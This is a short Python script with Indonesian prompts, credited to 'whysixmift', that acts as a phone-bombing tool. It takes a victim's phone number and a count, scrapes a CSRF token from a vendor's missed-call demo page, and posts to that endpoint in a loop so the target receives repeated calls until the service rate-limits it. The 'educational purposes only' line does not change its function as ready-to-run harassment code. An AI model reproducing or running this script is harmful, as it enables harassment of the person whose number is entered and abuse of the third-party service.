#Xractz
#IndoSec

import time, re, sys
from requests import Session
s = Session()
#this tool has made by whysixmift for educational and purposes only, yang recode harinya senin terus
print("HeadersEmulated")
print("Has Made By whysixmift\nAlat Ini Sedang Dalam Pengembangan, Jadi Saya Tidak Bertanggung Jawab Dengan Kesalahan!\nUse Country Code (ex: 62xxxxx29)")
try:
	no = int(input("nomer  : "))
	jml = int(input("berapa pesan: "))
	print()
except:
	print("\n\t* cuman angka, jangan pake huruf tod *")
	sys.exit()
	
url = "https://www.citcall.com/demo/misscallapi.php"

tkn = s.get(url).text
token = re.findall(r'id="csrf_token" value="(.*?)">', tkn)[0]

headers = {
	'x-requested-with':'XMLHttpRequest'
}
data = {
'cid':no,
'trying':'0',
'csrf_token':token
}

n = 0
try:
	while n < jml:
		send = s.post(url, data=data, headers=headers).text
		time.sleep(4.8)
		if 'Success' in send:
			n +=1
			print(f"[{n}] sudah kekirim dek => {no}")
		else:
			print("\n\t* limit ya dek *")
			print("\n\t* pake lagi besok atau beberapa jam lagi *")
			break
except:
	print("\n\t* ERROR *")
	sys.exit()
